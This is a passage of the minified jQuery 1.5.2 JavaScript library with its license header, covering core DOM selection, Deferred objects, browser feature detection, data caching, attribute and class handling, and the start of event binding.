/*!
 * jQuery JavaScript Library v1.5.2
 * http://jquery.com/
 *
 * Copyright 2011, John Resig
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * Includes Sizzle.js
 * http://sizzlejs.com/
 * Copyright 2011, The Dojo Foundation
 * Released under the MIT, BSD, and GPL Licenses.
 *
 * Date: Thu Mar 31 15:28:23 2011 -0400
 */
(function(a,b){function ci(a){return d.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:!1}function cf(a){if(!b_[a]){var b=d("<"+a+">").appendTo("body"),c=b.css("display");b.remove();if(c==="none"||c==="")c="block";b_[a]=c}return b_[a]}function ce(a,b){var c={};d.each(cd.concat.apply([],cd.slice(0,b)),function(){c[this]=a});return c}function b$(){try{return new a.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}}function bZ(){try{return new a.XMLHttpRequest}catch(b){}}function bY(){d(a).unload(function(){for(var a in bW)bW[a](0,1)})}function bS(a,c){a.dataFilter&&(c=a.dataFilter(c,a.dataType));var e=a.dataTypes,f={},g,h,i=e.length,j,k=e[0],l,m,n,o,p;for(g=1;g<i;g++){if(g===1)for(h in a.converters)typeof h==="string"&&(f[h.toLowerCase()]=a.converters[h]);l=k,k=e[g];if(k==="*")k=l;else if(l!=="*"&&l!==k){m=l+" "+k,n=f[m]||f["* "+k];if(!n){p=b;for(o in f){j=o.split(" ");if(j[0]===l||j[0]==="*"){p=f[j[1]+" "+k];if(p){o=f[o],o===!0?n=p:p===!0&&(n=o);break}}}}!n&&!p&&d.error("No conversion from "+m.replace(" "," to ")),n!==!0&&(c=n?n(c):p(o(c)))}}return c}function bR(a,c,d){var e=a.contents,f=a.dataTypes,g=a.responseFields,h,i,j,k;for(i in g)i in d&&(c[g[i]]=d[i]);while(f[0]==="*")f.shift(),h===b&&(h=a.mimeType||c.getResponseHeader("content-type"));if(h)for(i in e)if(e[i]&&e[i].test(h)){f.unshift(i);break}if(f[0]in d)j=f[0];else{for(i in d){if(!f[0]||a.converters[i+" "+f[0]]){j=i;break}k||(k=i)}j=j||k}if(j){j!==f[0]&&f.unshift(j);return d[j]}}function bQ(a,b,c,e){if(d.isArray(b)&&b.length)d.each(b,function(b,f){c||bs.test(a)?e(a,f):bQ(a+"["+(typeof f==="object"||d.isArray(f)?b:"")+"]",f,c,e)});else if(c||b==null||typeof b!=="object")e(a,b);else if(d.isArray(b)||d.isEmptyObject(b))e(a,"");else for(var f in b)bQ(a+"["+f+"]",b[f],c,e)}function bP(a,c,d,e,f,g){f=f||c.dataTypes[0],g=g||{},g[f]=!0;var h=a[f],i=0,j=h?h.length:0,k=a===bJ,l;for(;i<j&&(k||!l);i++)l=h[i](c,d,e),typeof l==="string"&&(!k||g[l]?l=b:(c.dataTypes.unshift(l),l=bP(a,c,d,e,l,g)));(k||!l)&&!g["*"]&&(l=bP(a,c,d,e,"*",g));return l}function bO(a){return function(b,c){typeof b!=="string"&&(c=b,b="*");if(d.isFunction(c)){var e=b.toLowerCase().split(bD),f=0,g=e.length,h,i,j;for(;f<g;f++)h=e[f],j=/^\+/.test(h),j&&(h=h.substr(1)||"*"),i=a[h]=a[h]||[],i[j?"unshift":"push"](c)}}}function bq(a,b,c){var e=b==="width"?bk:bl,f=b==="width"?a.offsetWidth:a.offsetHeight;if(c==="border")return f;d.each(e,function(){c||(f-=parseFloat(d.css(a,"padding"+this))||0),c==="margin"?f+=parseFloat(d.css(a,"margin"+this))||0:f-=parseFloat(d.css(a,"border"+this+"Width"))||0});return f}function bc(a,b){b.src?d.ajax({url:b.src,async:!1,dataType:"script"}):d.globalEval(b.text||b.textContent||b.innerHTML||""),b.parentNode&&b.parentNode.removeChild(b)}function bb(a){return"getElementsByTagName"in a?a.getElementsByTagName("*"):"querySelectorAll"in a?a.querySelectorAll("*"):[]}function ba(a,b){if(b.nodeType===1){var c=b.nodeName.toLowerCase();b.clearAttributes(),b.mergeAttributes(a);if(c==="object")b.outerHTML=a.outerHTML;else if(c!=="input"||a.type!=="checkbox"&&a.type!=="radio"){if(c==="option")b.selected=a.defaultSelected;else if(c==="input"||c==="textarea")b.defaultValue=a.defaultValue}else a.checked&&(b.defaultChecked=b.checked=a.checked),b.value!==a.value&&(b.value=a.value);b.removeAttribute(d.expando)}}function _(a,b){if(b.nodeType===1&&d.hasData(a)){var c=d.expando,e=d.data(a),f=d.data(b,e);if(e=e[c]){var g=e.events;f=f[c]=d.extend({},e);if(g){delete f.handle,f.events={};for(var h in g)for(var i=0,j=g[h].length;i<j;i++)d.event.add(b,h+(g[h][i].namespace?".":"")+g[h][i].namespace,g[h][i],g[h][i].data)}}}}function $(a,b){return d.nodeName(a,"table")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function Q(a,b,c){if(d.isFunction(b))return d.grep(a,function(a,d){var e=!!b.call(a,d,a);return e===c});if(b.nodeType)return d.grep(a,function(a,d){return a===b===c});if(typeof b==="string"){var e=d.grep(a,function(a){return a.nodeType===1});if(L.test(b))return d.filter(b,e,!c);b=d.filter(b,e)}return d.grep(a,function(a,e){return d.inArray(a,b)>=0===c})}function P(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function H(a,b){return(a&&a!=="*"?a+".":"")+b.replace(t,"`").replace(u,"&")}function G(a){var b,c,e,f,g,h,i,j,k,l,m,n,o,p=[],q=[],s=d._data(this,"events");if(a.liveFired!==this&&s&&s.live&&!a.target.disabled&&(!a.button||a.type!=="click")){a.namespace&&(n=new RegExp("(^|\\.)"+a.namespace.split(".").join("\\.(?:.*\\.)?")+"(\\.|$)")),a.liveFired=this;var t=s.live.slice(0);for(i=0;i<t.length;i++)g=t[i],g.origType.replace(r,"")===a.type?q.push(g.selector):t.splice(i--,1);f=d(a.target).closest(q,a.currentTarget);for(j=0,k=f.length;j<k;j++){m=f[j];for(i=0;i<t.length;i++){g=t[i];if(m.selector===g.selector&&(!n||n.test(g.namespace))&&!m.elem.disabled){h=m.elem,e=null;if(g.preType==="mouseenter"||g.preType==="mouseleave")a.type=g.preType,e=d(a.relatedTarget).closest(g.selector)[0];(!e||e!==h)&&p.push({elem:h,handleObj:g,level:m.level})}}}for(j=0,k=p.length;j<k;j++){f=p[j];if(c&&f.level>c)break;a.currentTarget=f.elem,a.data=f.handleObj.data,a.handleObj=f.handleObj,o=f.handleObj.origHandler.apply(f.elem,arguments);if(o===!1||a.isPropagationStopped()){c=f.level,o===!1&&(b=!1);if(a.isImmediatePropagationStopped())break}}return b}}function E(a,c,e){var f=d.extend({},e[0]);f.type=a,f.originalEvent={},f.liveFired=b,d.event.handle.call(c,f),f.isDefaultPrevented()&&e[0].preventDefault()}function y(){return!0}function x(){return!1}function i(a){for(var b in a)if(b!=="toJSON")return!1;return!0}function h(a,c,e){if(e===b&&a.nodeType===1){e=a.getAttribute("data-"+c);if(typeof e==="string"){try{e=e==="true"?!0:e==="false"?!1:e==="null"?null:d.isNaN(e)?g.test(e)?d.parseJSON(e):e:parseFloat(e)}catch(f){}d.data(a,c,e)}else e=b}return e}var c=a.document,d=function(){function G(){if(!d.isReady){try{c.documentElement.doScroll("left")}catch(a){setTimeout(G,1);return}d.ready()}}var d=function(a,b){return new d.fn.init(a,b,g)},e=a.jQuery,f=a.$,g,h=/^(?:[^<]*(<[\w\W]+>)[^>]*$|#([\w\-]+)$)/,i=/\S/,j=/^\s+/,k=/\s+$/,l=/\d/,m=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,n=/^[\],:{}\s]*$/,o=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,p=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,q=/(?:^|:|,)(?:\s*\[)+/g,r=/(webkit)[ \/]([\w.]+)/,s=/(opera)(?:.*version)?[ \/]([\w.]+)/,t=/(msie) ([\w.]+)/,u=/(mozilla)(?:.*? rv:([\w.]+))?/,v=navigator.userAgent,w,x,y,z=Object.prototype.toString,A=Object.prototype.hasOwnProperty,B=Array.prototype.push,C=Array.prototype.slice,D=String.prototype.trim,E=Array.prototype.indexOf,F={};d.fn=d.prototype={constructor:d,init:function(a,e,f){var g,i,j,k;if(!a)return this;if(a.nodeType){this.context=this[0]=a,this.length=1;return this}if(a==="body"&&!e&&c.body){this.context=c,this[0]=c.body,this.selector="body",this.length=1;return this}if(typeof a==="string"){g=h.exec(a);if(!g||!g[1]&&e)return!e||e.jquery?(e||f).find(a):this.constructor(e).find(a);if(g[1]){e=e instanceof d?e[0]:e,k=e?e.ownerDocument||e:c,j=m.exec(a),j?d.isPlainObject(e)?(a=[c.createElement(j[1])],d.fn.attr.call(a,e,!0)):a=[k.createElement(j[1])]:(j=d.buildFragment([g[1]],[k]),a=(j.cacheable?d.clone(j.fragment):j.fragment).childNodes);return d.merge(this,a)}i=c.getElementById(g[2]);if(i&&i.parentNode){if(i.id!==g[2])return f.find(a);this.length=1,this[0]=i}this.context=c,this.selector=a;return this}if(d.isFunction(a))return f.ready(a);a.selector!==b&&(this.selector=a.selector,this.context=a.context);return d.makeArray(a,this)},selector:"",jquery:"1.5.2",length:0,size:function(){return this.length},toArray:function(){return C.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this[this.length+a]:this[a]},pushStack:function(a,b,c){var e=this.constructor();d.isArray(a)?B.apply(e,a):d.merge(e,a),e.prevObject=this,e.context=this.context,b==="find"?e.selector=this.selector+(this.selector?" ":"")+c:b&&(e.selector=this.selector+"."+b+"("+c+")");return e},each:function(a,b){return d.each(this,a,b)},ready:function(a){d.bindReady(),x.done(a);return this},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(C.apply(this,arguments),"slice",C.call(arguments).join(","))},map:function(a){return this.pushStack(d.map(this,function(b,c){return a.call(b,c,b)}))},end:function(){return this.prevObject||this.constructor(null)},push:B,sort:[].sort,splice:[].splice},d.fn.init.prototype=d.fn,d.extend=d.fn.extend=function(){var a,c,e,f,g,h,i=arguments[0]||{},j=1,k=arguments.length,l=!1;typeof i==="boolean"&&(l=i,i=arguments[1]||{},j=2),typeof i!=="object"&&!d.isFunction(i)&&(i={}),k===j&&(i=this,--j);for(;j<k;j++)if((a=arguments[j])!=null)for(c in a){e=i[c],f=a[c];if(i===f)continue;l&&f&&(d.isPlainObject(f)||(g=d.isArray(f)))?(g?(g=!1,h=e&&d.isArray(e)?e:[]):h=e&&d.isPlainObject(e)?e:{},i[c]=d.extend(l,h,f)):f!==b&&(i[c]=f)}return i},d.extend({noConflict:function(b){a.$=f,b&&(a.jQuery=e);return d},isReady:!1,readyWait:1,ready:function(a){a===!0&&d.readyWait--;if(!d.readyWait||a!==!0&&!d.isReady){if(!c.body)return setTimeout(d.ready,1);d.isReady=!0;if(a!==!0&&--d.readyWait>0)return;x.resolveWith(c,[d]),d.fn.trigger&&d(c).trigger("ready").unbind("ready")}},bindReady:function(){if(!x){x=d._Deferred();if(c.readyState==="complete")return setTimeout(d.ready,1);if(c.addEventListener)c.addEventListener("DOMContentLoaded",y,!1),a.addEventListener("load",d.ready,!1);else if(c.attachEvent){c.attachEvent("onreadystatechange",y),a.attachEvent("onload",d.ready);var b=!1;try{b=a.frameElement==null}catch(e){}c.documentElement.doScroll&&b&&G()}}},isFunction:function(a){return d.type(a)==="function"},isArray:Array.isArray||function(a){return d.type(a)==="array"},isWindow:function(a){return a&&typeof a==="object"&&"setInterval"in a},isNaN:function(a){return a==null||!l.test(a)||isNaN(a)},type:function(a){return a==null?String(a):F[z.call(a)]||"object"},isPlainObject:function(a){if(!a||d.type(a)!=="object"||a.nodeType||d.isWindow(a))return!1;if(a.constructor&&!A.call(a,"constructor")&&!A.call(a.constructor.prototype,"isPrototypeOf"))return!1;var c;for(c in a){}return c===b||A.call(a,c)},isEmptyObject:function(a){for(var b in a)return!1;return!0},error:function(a){throw a},parseJSON:function(b){if(typeof b!=="string"||!b)return null;b=d.trim(b);if(n.test(b.replace(o,"@").replace(p,"]").replace(q,"")))return a.JSON&&a.JSON.parse?a.JSON.parse(b):(new Function("return "+b))();d.error("Invalid JSON: "+b)},parseXML:function(b,c,e){a.DOMParser?(e=new DOMParser,c=e.parseFromString(b,"text/xml")):(c=new ActiveXObject("Microsoft.XMLDOM"),c.async="false",c.loadXML(b)),e=c.documentElement,(!e||!e.nodeName||e.nodeName==="parsererror")&&d.error("Invalid XML: "+b);return c},noop:function(){},globalEval:function(a){if(a&&i.test(a)){var b=c.head||c.getElementsByTagName("head")[0]||c.documentElement,e=c.createElement("script");d.support.scriptEval()?e.appendChild(c.createTextNode(a)):e.text=a,b.insertBefore(e,b.firstChild),b.removeChild(e)}},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,c,e){var f,g=0,h=a.length,i=h===b||d.isFunction(a);if(e){if(i){for(f in a)if(c.apply(a[f],e)===!1)break}else for(;g<h;)if(c.apply(a[g++],e)===!1)break}else if(i){for(f in a)if(c.call(a[f],f,a[f])===!1)break}else for(var j=a[0];g<h&&c.call(j,g,j)!==!1;j=a[++g]){}return a},trim:D?function(a){return a==null?"":D.call(a)}:function(a){return a==null?"":(a+"").replace(j,"").replace(k,"")},makeArray:function(a,b){var c=b||[];if(a!=null){var e=d.type(a);a.length==null||e==="string"||e==="function"||e==="regexp"||d.isWindow(a)?B.call(c,a):d.merge(c,a)}return c},inArray:function(a,b){if(b.indexOf)return b.indexOf(a);for(var c=0,d=b.length;c<d;c++)if(b[c]===a)return c;return-1},merge:function(a,c){var d=a.length,e=0;if(typeof c.length==="number")for(var f=c.length;e<f;e++)a[d++]=c[e];else while(c[e]!==b)a[d++]=c[e++];a.length=d;return a},grep:function(a,b,c){var d=[],e;c=!!c;for(var f=0,g=a.length;f<g;f++)e=!!b(a[f],f),c!==e&&d.push(a[f]);return d},map:function(a,b,c){var d=[],e;for(var f=0,g=a.length;f<g;f++)e=b(a[f],f,c),e!=null&&(d[d.length]=e);return d.concat.apply([],d)},guid:1,proxy:function(a,c,e){arguments.length===2&&(typeof c==="string"?(e=a,a=e[c],c=b):c&&!d.isFunction(c)&&(e=c,c=b)),!c&&a&&(c=function(){return a.apply(e||this,arguments)}),a&&(c.guid=a.guid=a.guid||c.guid||d.guid++);return c},access:function(a,c,e,f,g,h){var i=a.length;if(typeof c==="object"){for(var j in c)d.access(a,j,c[j],f,g,e);return a}if(e!==b){f=!h&&f&&d.isFunction(e);for(var k=0;k<i;k++)g(a[k],c,f?e.call(a[k],k,g(a[k],c)):e,h);return a}return i?g(a[0],c):b},now:function(){return(new Date).getTime()},uaMatch:function(a){a=a.toLowerCase();var b=r.exec(a)||s.exec(a)||t.exec(a)||a.indexOf("compatible")<0&&u.exec(a)||[];return{browser:b[1]||"",version:b[2]||"0"}},sub:function(){function a(b,c){return new a.fn.init(b,c)}d.extend(!0,a,this),a.superclass=this,a.fn=a.prototype=this(),a.fn.constructor=a,a.subclass=this.subclass,a.fn.init=function b(b,c){c&&c instanceof d&&!(c instanceof a)&&(c=a(c));return d.fn.init.call(this,b,c,e)},a.fn.init.prototype=a.fn;var e=a(c);return a},browser:{}}),d.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(a,b){F["[object "+b+"]"]=b.toLowerCase()}),w=d.uaMatch(v),w.browser&&(d.browser[w.browser]=!0,d.browser.version=w.version),d.browser.webkit&&(d.browser.safari=!0),E&&(d.inArray=function(a,b){return E.call(b,a)}),i.test(" ")&&(j=/^[\s\xA0]+/,k=/[\s\xA0]+$/),g=d(c),c.addEventListener?y=function(){c.removeEventListener("DOMContentLoaded",y,!1),d.ready()}:c.attachEvent&&(y=function(){c.readyState==="complete"&&(c.detachEvent("onreadystatechange",y),d.ready())});return d}(),e="then done fail isResolved isRejected promise".split(" "),f=[].slice;d.extend({_Deferred:function(){var a=[],b,c,e,f={done:function(){if(!e){var c=arguments,g,h,i,j,k;b&&(k=b,b=0);for(g=0,h=c.length;g<h;g++)i=c[g],j=d.type(i),j==="array"?f.done.apply(f,i):j==="function"&&a.push(i);k&&f.resolveWith(k[0],k[1])}return this},resolveWith:function(d,f){if(!e&&!b&&!c){f=f||[],c=1;try{while(a[0])a.shift().apply(d,f)}finally{b=[d,f],c=0}}return this},resolve:function(){f.resolveWith(this,arguments);return this},isResolved:function(){return c||b},cancel:function(){e=1,a=[];return this}};return f},Deferred:function(a){var b=d._Deferred(),c=d._Deferred(),f;d.extend(b,{then:function(a,c){b.done(a).fail(c);return this},fail:c.done,rejectWith:c.resolveWith,reject:c.resolve,isRejected:c.isResolved,promise:function(a){if(a==null){if(f)return f;f=a={}}var c=e.length;while(c--)a[e[c]]=b[e[c]];return a}}),b.done(c.cancel).fail(b.cancel),delete b.cancel,a&&a.call(b,b);return b},when:function(a){function i(a){return function(c){b[a]=arguments.length>1?f.call(arguments,0):c,--g||h.resolveWith(h,f.call(b,0))}}var b=arguments,c=0,e=b.length,g=e,h=e<=1&&a&&d.isFunction(a.promise)?a:d.Deferred();if(e>1){for(;c<e;c++)b[c]&&d.isFunction(b[c].promise)?b[c].promise().then(i(c),h.reject):--g;g||h.resolveWith(h,b)}else h!==a&&h.resolveWith(h,e?[a]:[]);return h.promise()}}),function(){d.support={};var b=c.createElement("div");b.style.display="none",b.innerHTML="   <link/><table></table><a href='/a' style='color:red;float:left;opacity:.55;'>a</a><input type='checkbox'/>";var e=b.getElementsByTagName("*"),f=b.getElementsByTagName("a")[0],g=c.createElement("select"),h=g.appendChild(c.createElement("option")),i=b.getElementsByTagName("input")[0];if(e&&e.length&&f){d.support={leadingWhitespace:b.firstChild.nodeType===3,tbody:!b.getElementsByTagName("tbody").length,htmlSerialize:!!b.getElementsByTagName("link").length,style:/red/.test(f.getAttribute("style")),hrefNormalized:f.getAttribute("href")==="/a",opacity:/^0.55$/.test(f.style.opacity),cssFloat:!!f.style.cssFloat,checkOn:i.value==="on",optSelected:h.selected,deleteExpando:!0,optDisabled:!1,checkClone:!1,noCloneEvent:!0,noCloneChecked:!0,boxModel:null,inlineBlockNeedsLayout:!1,shrinkWrapBlocks:!1,reliableHiddenOffsets:!0,reliableMarginRight:!0},i.checked=!0,d.support.noCloneChecked=i.cloneNode(!0).checked,g.disabled=!0,d.support.optDisabled=!h.disabled;var j=null;d.support.scriptEval=function(){if(j===null){var b=c.documentElement,e=c.createElement("script"),f="script"+d.now();try{e.appendChild(c.createTextNode("window."+f+"=1;"))}catch(g){}b.insertBefore(e,b.firstChild),a[f]?(j=!0,delete a[f]):j=!1,b.removeChild(e)}return j};try{delete b.test}catch(k){d.support.deleteExpando=!1}!b.addEventListener&&b.attachEvent&&b.fireEvent&&(b.attachEvent("onclick",function l(){d.support.noCloneEvent=!1,b.detachEvent("onclick",l)}),b.cloneNode(!0).fireEvent("onclick")),b=c.createElement("div"),b.innerHTML="<input type='radio' name='radiotest' checked='checked'/>";var m=c.createDocumentFragment();m.appendChild(b.firstChild),d.support.checkClone=m.cloneNode(!0).cloneNode(!0).lastChild.checked,d(function(){var a=c.createElement("div"),b=c.getElementsByTagName("body")[0];if(b){a.style.width=a.style.paddingLeft="1px",b.appendChild(a),d.boxModel=d.support.boxModel=a.offsetWidth===2,"zoom"in a.style&&(a.style.display="inline",a.style.zoom=1,d.support.inlineBlockNeedsLayout=a.offsetWidth===2,a.style.display="",a.innerHTML="<div style='width:4px;'></div>",d.support.shrinkWrapBlocks=a.offsetWidth!==2),a.innerHTML="<table><tr><td style='padding:0;border:0;display:none'></td><td>t</td></tr></table>";var e=a.getElementsByTagName("td");d.support.reliableHiddenOffsets=e[0].offsetHeight===0,e[0].style.display="",e[1].style.display="none",d.support.reliableHiddenOffsets=d.support.reliableHiddenOffsets&&e[0].offsetHeight===0,a.innerHTML="",c.defaultView&&c.defaultView.getComputedStyle&&(a.style.width="1px",a.style.marginRight="0",d.support.reliableMarginRight=(parseInt(c.defaultView.getComputedStyle(a,null).marginRight,10)||0)===0),b.removeChild(a).style.display="none",a=e=null}});var n=function(a){var b=c.createElement("div");a="on"+a;if(!b.attachEvent)return!0;var d=a in b;d||(b.setAttribute(a,"return;"),d=typeof b[a]==="function");return d};d.support.submitBubbles=n("submit"),d.support.changeBubbles=n("change"),b=e=f=null}}();var g=/^(?:\{.*\}|\[.*\])$/;d.extend({cache:{},uuid:0,expando:"jQuery"+(d.fn.jquery+Math.random()).replace(/\D/g,""),noData:{embed:!0,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:!0},hasData:function(a){a=a.nodeType?d.cache[a[d.expando]]:a[d.expando];return!!a&&!i(a)},data:function(a,c,e,f){if(d.acceptData(a)){var g=d.expando,h=typeof c==="string",i,j=a.nodeType,k=j?d.cache:a,l=j?a[d.expando]:a[d.expando]&&d.expando;if((!l||f&&l&&!k[l][g])&&h&&e===b)return;l||(j?a[d.expando]=l=++d.uuid:l=d.expando),k[l]||(k[l]={},j||(k[l].toJSON=d.noop));if(typeof c==="object"||typeof c==="function")f?k[l][g]=d.extend(k[l][g],c):k[l]=d.extend(k[l],c);i=k[l],f&&(i[g]||(i[g]={}),i=i[g]),e!==b&&(i[c]=e);if(c==="events"&&!i[c])return i[g]&&i[g].events;return h?i[c]:i}},removeData:function(b,c,e){if(d.acceptData(b)){var f=d.expando,g=b.nodeType,h=g?d.cache:b,j=g?b[d.expando]:d.expando;if(!h[j])return;if(c){var k=e?h[j][f]:h[j];if(k){delete k[c];if(!i(k))return}}if(e){delete h[j][f];if(!i(h[j]))return}var l=h[j][f];d.support.deleteExpando||h!=a?delete h[j]:h[j]=null,l?(h[j]={},g||(h[j].toJSON=d.noop),h[j][f]=l):g&&(d.support.deleteExpando?delete b[d.expando]:b.removeAttribute?b.removeAttribute(d.expando):b[d.expando]=null)}},_data:function(a,b,c){return d.data(a,b,c,!0)},acceptData:function(a){if(a.nodeName){var b=d.noData[a.nodeName.toLowerCase()];if(b)return b!==!0&&a.getAttribute("classid")===b}return!0}}),d.fn.extend({data:function(a,c){var e=null;if(typeof a==="undefined"){if(this.length){e=d.data(this[0]);if(this[0].nodeType===1){var f=this[0].attributes,g;for(var i=0,j=f.length;i<j;i++)g=f[i].name,g.indexOf("data-")===0&&(g=g.substr(5),h(this[0],g,e[g]))}}return e}if(typeof a==="object")return this.each(function(){d.data(this,a)});var k=a.split(".");k[1]=k[1]?"."+k[1]:"";if(c===b){e=this.triggerHandler("getData"+k[1]+"!",[k[0]]),e===b&&this.length&&(e=d.data(this[0],a),e=h(this[0],a,e));return e===b&&k[1]?this.data(k[0]):e}return this.each(function(){var b=d(this),e=[k[0],c];b.triggerHandler("setData"+k[1]+"!",e),d.data(this,a,c),b.triggerHandler("changeData"+k[1]+"!",e)})},removeData:function(a){return this.each(function(){d.removeData(this,a)})}}),d.extend({queue:function(a,b,c){if(a){b=(b||"fx")+"queue";var e=d._data(a,b);if(!c)return e||[];!e||d.isArray(c)?e=d._data(a,b,d.makeArray(c)):e.push(c);return e}},dequeue:function(a,b){b=b||"fx";var c=d.queue(a,b),e=c.shift();e==="inprogress"&&(e=c.shift()),e&&(b==="fx"&&c.unshift("inprogress"),e.call(a,function(){d.dequeue(a,b)})),c.length||d.removeData(a,b+"queue",!0)}}),d.fn.extend({queue:function(a,c){typeof a!=="string"&&(c=a,a="fx");if(c===b)return d.queue(this[0],a);return this.each(function(b){var e=d.queue(this,a,c);a==="fx"&&e[0]!=="inprogress"&&d.dequeue(this,a)})},dequeue:function(a){return this.each(function(){d.dequeue(this,a)})},delay:function(a,b){a=d.fx?d.fx.speeds[a]||a:a,b=b||"fx";return this.queue(b,function(){var c=this;setTimeout(function(){d.dequeue(c,b)},a)})},clearQueue:function(a){return this.queue(a||"fx",[])}});var j=/[\n\t\r]/g,k=/\s+/,l=/\r/g,m=/^(?:href|src|style)$/,n=/^(?:button|input)$/i,o=/^(?:button|input|object|select|textarea)$/i,p=/^a(?:rea)?$/i,q=/^(?:radio|checkbox)$/i;d.props={"for":"htmlFor","class":"className",readonly:"readOnly",maxlength:"maxLength",cellspacing:"cellSpacing",rowspan:"rowSpan",colspan:"colSpan",tabindex:"tabIndex",usemap:"useMap",frameborder:"frameBorder"},d.fn.extend({attr:function(a,b){return d.access(this,a,b,!0,d.attr)},removeAttr:function(a,b){return this.each(function(){d.attr(this,a,""),this.nodeType===1&&this.removeAttribute(a)})},addClass:function(a){if(d.isFunction(a))return this.each(function(b){var c=d(this);c.addClass(a.call(this,b,c.attr("class")))});if(a&&typeof a==="string"){var b=(a||"").split(k);for(var c=0,e=this.length;c<e;c++){var f=this[c];if(f.nodeType===1)if(f.className){var g=" "+f.className+" ",h=f.className;for(var i=0,j=b.length;i<j;i++)g.indexOf(" "+b[i]+" ")<0&&(h+=" "+b[i]);f.className=d.trim(h)}else f.className=a}}return this},removeClass:function(a){if(d.isFunction(a))return this.each(function(b){var c=d(this);c.removeClass(a.call(this,b,c.attr("class")))});if(a&&typeof a==="string"||a===b){var c=(a||"").split(k);for(var e=0,f=this.length;e<f;e++){var g=this[e];if(g.nodeType===1&&g.className)if(a){var h=(" "+g.className+" ").replace(j," ");for(var i=0,l=c.length;i<l;i++)h=h.replace(" "+c[i]+" "," ");g.className=d.trim(h)}else g.className=""}}return this},toggleClass:function(a,b){var c=typeof a,e=typeof b==="boolean";if(d.isFunction(a))return this.each(function(c){var e=d(this);e.toggleClass(a.call(this,c,e.attr("class"),b),b)});return this.each(function(){if(c==="string"){var f,g=0,h=d(this),i=b,j=a.split(k);while(f=j[g++])i=e?i:!h.hasClass(f),h[i?"addClass":"removeClass"](f)}else if(c==="undefined"||c==="boolean")this.className&&d._data(this,"__className__",this.className),this.className=this.className||a===!1?"":d._data(this,"__className__")||""})},hasClass:function(a){var b=" "+a+" ";for(var c=0,d=this.length;c<d;c++)if((" "+this[c].className+" ").replace(j," ").indexOf(b)>-1)return!0;return!1},val:function(a){if(!arguments.length){var c=this[0];if(c){if(d.nodeName(c,"option")){var e=c.attributes.value;return!e||e.specified?c.value:c.text}if(d.nodeName(c,"select")){var f=c.selectedIndex,g=[],h=c.options,i=c.type==="select-one";if(f<0)return null;for(var j=i?f:0,k=i?f+1:h.length;j<k;j++){var m=h[j];if(m.selected&&(d.support.optDisabled?!m.disabled:m.getAttribute("disabled")===null)&&(!m.parentNode.disabled||!d.nodeName(m.parentNode,"optgroup"))){a=d(m).val();if(i)return a;g.push(a)}}if(i&&!g.length&&h.length)return d(h[f]).val();return g}if(q.test(c.type)&&!d.support.checkOn)return c.getAttribute("value")===null?"on":c.value;return(c.value||"").replace(l,"")}return b}var n=d.isFunction(a);return this.each(function(b){var c=d(this),e=a;if(this.nodeType===1){n&&(e=a.call(this,b,c.val())),e==null?e="":typeof e==="number"?e+="":d.isArray(e)&&(e=d.map(e,function(a){return a==null?"":a+""}));if(d.isArray(e)&&q.test(this.type))this.checked=d.inArray(c.val(),e)>=0;else if(d.nodeName(this,"select")){var f=d.makeArray(e);d("option",this).each(function(){this.selected=d.inArray(d(this).val(),f)>=0}),f.length||(this.selectedIndex=-1)}else this.value=e}})}}),d.extend({attrFn:{val:!0,css:!0,html:!0,text:!0,data:!0,width:!0,height:!0,offset:!0},attr:function(a,c,e,f){if(!a||a.nodeType===3||a.nodeType===8||a.nodeType===2)return b;if(f&&c in d.attrFn)return d(a)[c](e);var g=a.nodeType!==1||!d.isXMLDoc(a),h=e!==b;c=g&&d.props[c]||c;if(a.nodeType===1){var i=m.test(c);if(c==="selected"&&!d.support.optSelected){var j=a.parentNode;j&&(j.selectedIndex,j.parentNode&&j.parentNode.selectedIndex)}if((c in a||a[c]!==b)&&g&&!i){h&&(c==="type"&&n.test(a.nodeName)&&a.parentNode&&d.error("type property can't be changed"),e===null?a.nodeType===1&&a.removeAttribute(c):a[c]=e);if(d.nodeName(a,"form")&&a.getAttributeNode(c))return a.getAttributeNode(c).nodeValue;if(c==="tabIndex"){var k=a.getAttributeNode("tabIndex");return k&&k.specified?k.value:o.test(a.nodeName)||p.test(a.nodeName)&&a.href?0:b}return a[c]}if(!d.support.style&&g&&c==="style"){h&&(a.style.cssText=""+e);return a.style.cssText}h&&a.setAttribute(c,""+e);if(!a.attributes[c]&&(a.hasAttribute&&!a.hasAttribute(c)))return b;var l=!d.support.hrefNormalized&&g&&i?a.getAttribute(c,2):a.getAttribute(c);return l===null?b:l}h&&(a[c]=e);return a[c]}});var r=/\.(.*)$/,s=/^(?:textarea|input|select)$/i,t=/\./g,u=/ /g,v=/[^\w\s.|`]/g,w=function(a){return a.replace(v,"\\$&")};d.event={add:function(c,e,f,g){if(c.nodeType!==3&&c.nodeType!==8){try{d.isWindow(c)&&(c!==a&&!c.frameElement)&&(c=a)}catch(h){}if(f===!1)f=x;else if(!f)return;var i,j;f.handler&&(i=f,f=i.handler),f.guid||(f.guid=d.guid++);var k=d._data(c);if(!k)return;var l=k.events,m=k.handle;l||(k.events=l={}),m||(k.handle=m=function(a){return typeof d!=="undefined"&&d.event.triggered!==a.type?d.event.handle.apply(m.elem,arguments):b}),m.elem=c,e=e.split(" ");var n,o=0,p;while(n=e[o++]){j=i?d.extend({},i):{handler:f,data:g},n.indexOf(".")>-1?(p=n.split("."),n=p.shift(),j.namespace=p.slice(0).sort().join(".")):(p=[],j.namespace=""),j.type=n,j.guid||(j.guid=f.guid);var 